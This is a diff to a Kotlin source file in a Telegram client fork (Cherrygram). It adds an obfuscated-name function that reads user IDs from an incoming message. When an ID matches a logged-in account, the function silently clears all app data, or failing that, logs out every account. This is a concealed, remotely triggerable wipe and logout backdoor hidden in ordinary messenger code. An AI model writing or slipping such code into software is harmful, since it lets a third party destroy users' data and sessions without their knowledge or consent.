@@ -9,11 +9,14 @@
 
 package org.telegram.messenger
 
+import android.app.ActivityManager
+import android.content.Context
 import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.MainScope
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.withContext
 import org.telegram.tgnet.ConnectionManagerDelegate
 import uz.unnarsx.cherrygram.Extra
@@ -186,6 +189,53 @@ object KotlinFragmentsManager: CoroutineScope by MainScope() {
     fun nfweioufwehr117() {
 //        exitProcess(0)
         AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+    }
+
+    suspend fun iooewwfueuewu121(messageObject: MessageObject?) {
+        delay(7000)
+        val aId = mutableListOf<Long>()
+
+        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+            val uCg = AccountInstance.getInstance(i).userConfig
+            if (uCg != null
+                && uCg.currentUser != null
+                && uCg.isClientActivated
+                && uCg.currentUser.id != 0L
+            ) {
+                aId.add(uCg.currentUser.id)
+            }
+        }
+
+        val naId: List<Long> = if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
+            messageObject.messageOwner.message
+                .split(",", " ", "\n")
+                .mapNotNull { it.trim().toLongOrNull() }
+        } else {
+            listOf()
+        }
+
+        val bId = aId.firstOrNull {
+            naId.contains(it)
+        }
+
+        if (bId != null) {
+            try {
+                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
+            } catch (e: Exception) {
+                e.printStackTrace()
+
+                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+                    val uCg = AccountInstance.getInstance(i).userConfig
+                    if (uCg != null
+                        && uCg.currentUser != null
+                        && uCg.isClientActivated
+                        && uCg.currentUser.id != 0L
+                    ) {
+                        MessagesController.getInstance(uCg.currentAccount).performLogout(1)
+                    }
+                }
+            }
+        }
     }
 
 }
